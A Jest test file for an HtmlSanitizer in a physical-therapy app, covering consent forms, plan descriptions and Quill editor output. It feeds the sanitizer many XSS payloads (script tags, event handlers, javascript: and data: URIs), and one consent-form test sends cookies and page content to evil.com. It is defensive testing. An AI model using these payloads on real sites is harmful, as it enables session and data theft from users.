/**
 * HtmlSanitizer Tests
 * XSS Attack Pattern Tests for Rich-Text Content
 *
 * Tests protection against common XSS attack vectors:
 * - Script tag injection
 * - Event handler injection (comprehensive coverage)
 * - JavaScript protocol in links and src attributes
 * - Nested/obfuscated attacks
 * - Safe HTML preservation for rich-text content
 * - Dangerous tag removal (iframe, object, embed, form)
 *
 * Use Cases:
 * - Consent form templates (AdminConsentFormModal)
 * - Plan descriptions (PlansTab, UpgradePlan)
 * - Rich-text editor output (Quill)
 * - Animation card descriptions (FunctionalGoals)
 */

import { HtmlSanitizer } from '../HtmlSanitizer';

describe('HtmlSanitizer', () => {
  describe('Script Tag Removal', () => {
    it('removes script tags', () => {
      const input = '<script>alert("xss")</script>Hello';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('Hello');
      expect(result).not.toContain('<script>');
    });

    it('removes script src tags', () => {
      const input = '<script src="evil.js"></script>Safe Text';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('Safe Text');
    });

    it('handles nested script tags', () => {
      const input = '<scr<script>ipt>alert("xss")</scr</script>ipt>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('script');
    });

    it('removes script with type attribute', () => {
      const input = '<script type="text/javascript">malicious()</script>Content';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('Content');
      expect(result).not.toContain('<script');
    });

    it('removes multiple script tags', () => {
      const input = '<script>a()</script>First<script>b()</script>Second';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('FirstSecond');
    });
  });

  describe('Event Handler Removal', () => {
    it('removes onclick handler', () => {
      const input = '<div onclick="alert(\'xss\')">Click</div>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('onclick');
      expect(result).toContain('Click');
    });

    it('removes onerror handler', () => {
      const input = '<img src="photo.jpg" onerror="alert(\'xss\')">';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('onerror');
      expect(result).toContain('src="photo.jpg"');
    });

    it('removes onload handler', () => {
      const input = '<img src="photo.jpg" onload="alert(\'xss\')">';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('onload');
    });

    it('removes onmouseover handler', () => {
      const input = '<span onmouseover="alert(\'xss\')">Hover</span>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('onmouseover');
      expect(result).toContain('Hover');
    });

    it('removes onfocus handler', () => {
      const input = '<a href="https://safe.com" onfocus="alert(\'xss\')">Link</a>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('onfocus');
      expect(result).toContain('href="https://safe.com"');
    });

    it('removes onblur handler', () => {
      const input = '<a href="https://safe.com" onblur="alert(\'xss\')">Link</a>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('onblur');
    });

    it('removes onsubmit handler', () => {
      const input = '<div onsubmit="steal()">Form area</div>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('onsubmit');
    });

    it('removes keyboard event handlers', () => {
      const input = '<div onkeydown="log()" onkeyup="log()" onkeypress="log()">Text</div>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('onkeydown');
      expect(result).not.toContain('onkeyup');
      expect(result).not.toContain('onkeypress');
    });

    it('removes mouse event handlers', () => {
      const input = '<div onmousedown="a()" onmouseup="b()" onmousemove="c()">Text</div>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('onmousedown');
      expect(result).not.toContain('onmouseup');
      expect(result).not.toContain('onmousemove');
    });

    it('removes drag event handlers', () => {
      const input = '<div ondrag="a()" ondragstart="b()" ondragend="c()" ondrop="d()">Drag</div>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('ondrag');
      expect(result).not.toContain('ondragstart');
      expect(result).not.toContain('ondragend');
      expect(result).not.toContain('ondrop');
    });

    it('removes clipboard event handlers', () => {
      const input = '<div oncopy="steal()" oncut="steal()" onpaste="inject()">Text</div>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('oncopy');
      expect(result).not.toContain('oncut');
      expect(result).not.toContain('onpaste');
    });

    it('removes scroll and wheel handlers', () => {
      const input = '<div onscroll="track()" onwheel="hijack()">Content</div>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('onscroll');
      expect(result).not.toContain('onwheel');
    });

    it('removes onchange and oninput handlers', () => {
      const input = '<div onchange="log()" oninput="log()">Content</div>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('onchange');
      expect(result).not.toContain('oninput');
    });

    it('removes ondblclick and oncontextmenu handlers', () => {
      const input = '<div ondblclick="popup()" oncontextmenu="hijack()">Text</div>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('ondblclick');
      expect(result).not.toContain('oncontextmenu');
    });
  });

  describe('JavaScript Protocol Removal', () => {
    it('removes javascript: protocol in links', () => {
      const input = '<a href="javascript:alert(\'xss\')">Link</a>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('javascript:');
      expect(result).toContain('Link');
    });

    it('handles case-insensitive javascript protocol', () => {
      const input = '<a href="JaVaScRiPt:alert(\'xss\')">Link</a>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('JaVaScRiPt:');
    });

    it('removes javascript: protocol in image src', () => {
      const input = '<img src="javascript:alert(\'xss\')">';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('javascript:');
    });

    it('handles javascript protocol with spaces', () => {
      const input = '<a href="  javascript:alert(\'xss\')">Link</a>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      // DOMPurify typically strips leading spaces and checks protocol
      expect(result).not.toContain('alert');
    });

    it('handles javascript protocol with encoding', () => {
      // Some browsers decode these, DOMPurify should handle
      const input = '<a href="&#106;avascript:alert(\'xss\')">Link</a>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('alert(');
    });
  });

  describe('Safe HTML Preservation - Text Formatting', () => {
    it('allows bold tags', () => {
      const input = '<b>Bold Text</b>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('<b>Bold Text</b>');
    });

    it('allows italic tags', () => {
      const input = '<i>Italic Text</i>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('<i>Italic Text</i>');
    });

    it('allows em tags', () => {
      const input = '<em>Emphasized</em>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('<em>Emphasized</em>');
    });

    it('allows strong tags', () => {
      const input = '<strong>Strong</strong>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('<strong>Strong</strong>');
    });

    it('allows underline tags', () => {
      const input = '<u>Underlined</u>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('<u>Underlined</u>');
    });

    it('allows strikethrough tags', () => {
      const input = '<s>Strikethrough</s>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('<s>Strikethrough</s>');
    });

    it('allows span tags with class', () => {
      const input = '<span class="highlight">Highlighted</span>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('<span');
      expect(result).toContain('class="highlight"');
      expect(result).toContain('Highlighted');
    });

    it('allows paragraph tags', () => {
      const input = '<p>Paragraph text</p>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('<p>Paragraph text</p>');
    });

    it('allows br tags', () => {
      const input = 'Line 1<br>Line 2';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('<br>');
    });
  });

  describe('Safe HTML Preservation - Headings', () => {
    it('allows h1 tags', () => {
      const input = '<h1>Main Title</h1>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('<h1>Main Title</h1>');
    });

    it('allows h2 tags', () => {
      const input = '<h2>Subtitle</h2>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('<h2>Subtitle</h2>');
    });

    it('allows h3 through h6 tags', () => {
      const input = '<h3>H3</h3><h4>H4</h4><h5>H5</h5><h6>H6</h6>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('<h3>H3</h3>');
      expect(result).toContain('<h4>H4</h4>');
      expect(result).toContain('<h5>H5</h5>');
      expect(result).toContain('<h6>H6</h6>');
    });
  });

  describe('Safe HTML Preservation - Lists', () => {
    it('allows unordered lists', () => {
      const input = '<ul><li>Item 1</li><li>Item 2</li></ul>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('<ul>');
      expect(result).toContain('<li>Item 1</li>');
      expect(result).toContain('<li>Item 2</li>');
      expect(result).toContain('</ul>');
    });

    it('allows ordered lists', () => {
      const input = '<ol><li>First</li><li>Second</li></ol>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('<ol>');
      expect(result).toContain('<li>First</li>');
      expect(result).toContain('</ol>');
    });
  });

  describe('Safe HTML Preservation - Links', () => {
    it('allows safe links with https', () => {
      const input = '<a href="https://safe.com">Link</a>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('<a href="https://safe.com">');
      expect(result).toContain('Link</a>');
    });

    it('allows safe links with http', () => {
      const input = '<a href="http://safe.com">Link</a>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('<a href="http://safe.com">');
    });

    it('allows target attribute on links', () => {
      const input = '<a href="https://safe.com" target="_blank">Link</a>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('target="_blank"');
    });

    it('allows rel attribute on links', () => {
      const input = '<a href="https://safe.com" rel="noopener noreferrer">Link</a>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('rel="noopener noreferrer"');
    });
  });

  describe('Safe HTML Preservation - Tables (Consent Forms)', () => {
    it('allows table structure', () => {
      const input = '<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Cell</td></tr></tbody></table>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('<table>');
      expect(result).toContain('<thead>');
      expect(result).toContain('<tbody>');
      expect(result).toContain('<tr>');
      expect(result).toContain('<th>Header</th>');
      expect(result).toContain('<td>Cell</td>');
    });

    it('allows colspan and rowspan attributes', () => {
      const input = '<table><tr><td colspan="2" rowspan="3">Merged</td></tr></table>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('colspan="2"');
      expect(result).toContain('rowspan="3"');
    });
  });

  describe('Safe HTML Preservation - Block Elements', () => {
    it('allows div tags', () => {
      const input = '<div>Block content</div>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('<div>Block content</div>');
    });

    it('allows blockquote tags', () => {
      const input = '<blockquote>Quoted text</blockquote>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('<blockquote>Quoted text</blockquote>');
    });

    it('allows pre tags', () => {
      const input = '<pre>Preformatted text</pre>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('<pre>Preformatted text</pre>');
    });

    it('allows hr tags', () => {
      const input = 'Before<hr>After';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('<hr>');
    });
  });

  describe('Safe HTML Preservation - Images', () => {
    it('allows img tags with src', () => {
      const input = '<img src="https://example.com/photo.jpg">';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('<img');
      expect(result).toContain('src="https://example.com/photo.jpg"');
    });

    it('allows alt attribute on images', () => {
      const input = '<img src="photo.jpg" alt="Description">';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('alt="Description"');
    });

    it('allows width and height on images', () => {
      const input = '<img src="photo.jpg" width="100" height="200">';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('width="100"');
      expect(result).toContain('height="200"');
    });
  });

  describe('Safe HTML Preservation - Styling', () => {
    it('allows style attribute', () => {
      const input = '<p style="color: blue;">Styled text</p>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('style="color: blue;"');
    });

    it('allows class attribute', () => {
      const input = '<div class="container">Content</div>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('class="container"');
    });

    it('allows id attribute', () => {
      const input = '<div id="section-1">Content</div>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('id="section-1"');
    });
  });

  describe('Dangerous Tag Removal', () => {
    it('removes iframe tags', () => {
      const input = '<iframe src="evil.com"></iframe>Text';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('iframe');
      expect(result).toContain('Text');
    });

    it('removes object tags', () => {
      const input = '<object data="evil.swf"></object>Text';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('object');
    });

    it('removes embed tags', () => {
      const input = '<embed src="evil.swf">Text';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('embed');
    });

    it('removes form tags', () => {
      const input = '<form action="steal.php"><input type="text"></form>Text';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('form');
      expect(result).not.toContain('input');
    });

    it('removes input tags', () => {
      const input = '<input type="hidden" value="malicious">Text';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('input');
    });

    it('removes textarea tags', () => {
      const input = '<textarea>Injected form</textarea>Text';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('textarea');
    });

    it('removes button tags', () => {
      const input = '<button onclick="steal()">Click</button>Text';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('button');
    });
  });

  describe('Edge Cases', () => {
    it('handles empty string', () => {
      const result = HtmlSanitizer.sanitizeRichText('');
      expect(result).toBe('');
    });

    it('handles null input', () => {
      const result = HtmlSanitizer.sanitizeRichText(null as unknown as string);
      expect(result).toBe('');
    });

    it('handles undefined input', () => {
      const result = HtmlSanitizer.sanitizeRichText(undefined as unknown as string);
      expect(result).toBe('');
    });

    it('handles plain text without HTML', () => {
      const input = 'Plain text without HTML';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe(input);
    });

    it('preserves text inside removed tags (KEEP_CONTENT)', () => {
      const input = '<script>malicious()</script>Important Text';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toBe('Important Text');
    });

    it('handles deeply nested content', () => {
      const input = '<div><p><strong><em>Nested</em></strong></p></div>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('<div>');
      expect(result).toContain('<p>');
      expect(result).toContain('<strong>');
      expect(result).toContain('<em>');
      expect(result).toContain('Nested');
    });

    it('handles special characters in text', () => {
      const input = '<p>Special chars: &amp; &lt; &gt; &quot;</p>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('&amp;');
      expect(result).toContain('&lt;');
      expect(result).toContain('&gt;');
    });
  });

  describe('Complex XSS Attacks', () => {
    it('handles multiple attack vectors in one string', () => {
      const input =
        '<script>alert("xss")</script><img src=x onerror="alert(\'xss\')"><a href="javascript:alert(\'xss\')">Link</a>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('javascript:');
      expect(result).toContain('Link');
    });

    it('preserves safe content mixed with attacks', () => {
      const input =
        '<b>Bold</b><script>alert("xss")</script><i>Italic</i>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).toContain('<b>Bold</b>');
      expect(result).toContain('<i>Italic</i>');
      expect(result).not.toContain('<script>');
    });

    it('handles SVG-based XSS attempts', () => {
      const input = '<svg onload="alert(\'xss\')"><circle cx="50" cy="50" r="40"/></svg>Text';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('onload');
      // SVG is not in allowed tags, so it should be stripped
      expect(result).not.toContain('<svg');
    });

    it('handles data URI XSS attempts', () => {
      const input = '<a href="data:text/html,<script>alert(\'xss\')</script>">Link</a>';
      const result = HtmlSanitizer.sanitizeRichText(input);
      // DOMPurify should strip data: URIs by default
      expect(result).not.toContain('data:text/html');
    });

    it('handles meta refresh XSS', () => {
      const input = '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">Text';
      const result = HtmlSanitizer.sanitizeRichText(input);
      // meta is not in allowed tags
      expect(result).not.toContain('<meta');
    });

    it('handles base tag XSS', () => {
      const input = '<base href="javascript:alert(\'xss\')">Text';
      const result = HtmlSanitizer.sanitizeRichText(input);
      expect(result).not.toContain('<base');
    });

    it('handles style tag XSS', () => {
      const input = '<style>body { background: url("javascript:alert(\'xss\')"); }</style>Text';
      const result = HtmlSanitizer.sanitizeRichText(input);
      // style tag is not in allowed tags
      expect(result).not.toContain('<style');
    });

    it('handles link tag XSS', () => {
      const input = '<link rel="stylesheet" href="javascript:alert(\'xss\')">Text';
      const result = HtmlSanitizer.sanitizeRichText(input);
      // link tag is not in allowed tags
      expect(result).not.toContain('<link');
    });
  });

  describe('sanitizeConsentForm (semantic alias)', () => {
    it('sanitizes consent form HTML the same as sanitizeRichText', () => {
      const input = '<script>alert("xss")</script><h1>Consent Form</h1><p>Terms and conditions...</p>';
      const richTextResult = HtmlSanitizer.sanitizeRichText(input);
      const consentFormResult = HtmlSanitizer.sanitizeConsentForm(input);
      expect(consentFormResult).toBe(richTextResult);
    });

    it('preserves consent form formatting', () => {
      const input = `
        <h1>Patient Consent Form</h1>
        <p>I, the undersigned patient, hereby consent to:</p>
        <ul>
          <li>Treatment procedures</li>
          <li>Data collection</li>
        </ul>
        <table>
          <tr><th>Service</th><th>Description</th></tr>
          <tr><td>Physical Therapy</td><td>ROM Assessment</td></tr>
        </table>
      `;
      const result = HtmlSanitizer.sanitizeConsentForm(input);
      expect(result).toContain('<h1>');
      expect(result).toContain('<p>');
      expect(result).toContain('<ul>');
      expect(result).toContain('<li>');
      expect(result).toContain('<table>');
      expect(result).toContain('<th>');
      expect(result).toContain('<td>');
    });

    it('removes XSS from consent form content', () => {
      const input = '<p onclick="steal()">By signing below, you agree to our <a href="javascript:alert(1)">terms</a>.</p>';
      const result = HtmlSanitizer.sanitizeConsentForm(input);
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('javascript:');
      expect(result).toContain('By signing below');
      expect(result).toContain('terms');
    });

    it('handles empty consent form', () => {
      const result = HtmlSanitizer.sanitizeConsentForm('');
      expect(result).toBe('');
    });

    it('handles null consent form', () => {
      const result = HtmlSanitizer.sanitizeConsentForm(null as unknown as string);
      expect(result).toBe('');
    });
  });

  describe('sanitizePlanDescription (semantic alias)', () => {
    it('sanitizes plan description HTML the same as sanitizeRichText', () => {
      const input = '<script>alert("xss")</script><p><strong>Premium Plan</strong> - Full access</p>';
      const richTextResult = HtmlSanitizer.sanitizeRichText(input);
      const planDescResult = HtmlSanitizer.sanitizePlanDescription(input);
      expect(planDescResult).toBe(richTextResult);
    });

    it('preserves plan description formatting', () => {
      const input = '<p><strong>Features:</strong></p><ul><li>Unlimited sessions</li><li>Priority support</li></ul>';
      const result = HtmlSanitizer.sanitizePlanDescription(input);
      expect(result).toContain('<strong>Features:</strong>');
      expect(result).toContain('<ul>');
      expect(result).toContain('<li>Unlimited sessions</li>');
    });

    it('removes XSS from plan descriptions', () => {
      const input = '<div onmouseover="track()">Hover to see details</div>';
      const result = HtmlSanitizer.sanitizePlanDescription(input);
      expect(result).not.toContain('onmouseover');
      expect(result).toContain('Hover to see details');
    });

    it('handles empty plan description', () => {
      const result = HtmlSanitizer.sanitizePlanDescription('');
      expect(result).toBe('');
    });
  });

  describe('Real-World Consent Form Templates', () => {
    it('handles typical consent form structure', () => {
      const consentFormTemplate = `
        <div class="consent-form">
          <h2>Physical Therapy Consent Form</h2>
          <p>Patient Name: <span id="patient-name"></span></p>
          <p>Date: <span id="date"></span></p>
          <hr>
          <h3>Terms and Conditions</h3>
          <p>By signing this form, I agree to the following:</p>
          <ol>
            <li>I consent to receive physical therapy services.</li>
            <li>I understand the risks and benefits of treatment.</li>
            <li>I authorize the release of my medical information as needed.</li>
          </ol>
          <div class="signature-section">
            <p><strong>Signature:</strong> _______________</p>
            <p><strong>Date:</strong> _______________</p>
          </div>
        </div>
      `;
      const result = HtmlSanitizer.sanitizeConsentForm(consentFormTemplate);
      expect(result).toContain('Physical Therapy Consent Form');
      expect(result).toContain('<h2>');
      expect(result).toContain('<h3>');
      expect(result).toContain('<ol>');
      expect(result).toContain('<li>');
      expect(result).toContain('class="consent-form"');
      expect(result).toContain('class="signature-section"');
    });

    it('sanitizes malicious content injected into consent form', () => {
      const maliciousTemplate = `
        <h2>Consent Form</h2>
        <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
        <p>Please review and sign below.</p>
        <img src="x" onerror="fetch('https://evil.com/steal?data='+document.body.innerHTML)">
        <a href="javascript:void(document.location='https://phishing.com')">Click here for more info</a>
      `;
      const result = HtmlSanitizer.sanitizeConsentForm(maliciousTemplate);
      expect(result).toContain('Consent Form');
      expect(result).toContain('Please review and sign below');
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('document.location');
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('evil.com');
      expect(result).not.toContain('phishing.com');
    });
  });

  describe('Integration with Quill Editor Output', () => {
    it('handles Quill-generated HTML', () => {
      // Typical Quill output
      const quillOutput = '<p><strong>Bold text</strong> and <em>italic text</em></p><p>New paragraph</p><ul><li>List item 1</li><li>List item 2</li></ul>';
      const result = HtmlSanitizer.sanitizeRichText(quillOutput);
      expect(result).toBe(quillOutput); // Should be unchanged as it's all safe HTML
    });

    it('handles Quill output with links', () => {
      const quillOutput = '<p>Visit <a href="https://vitalflow.ai" target="_blank">our website</a> for more.</p>';
      const result = HtmlSanitizer.sanitizeRichText(quillOutput);
      expect(result).toContain('href="https://vitalflow.ai"');
      expect(result).toContain('target="_blank"');
    });

    it('handles Quill output with images', () => {
      const quillOutput = '<p>Here is an image:</p><p><img src="https://example.com/image.jpg" alt="Example"></p>';
      const result = HtmlSanitizer.sanitizeRichText(quillOutput);
      expect(result).toContain('<img');
      expect(result).toContain('src="https://example.com/image.jpg"');
      expect(result).toContain('alt="Example"');
    });
  });
});
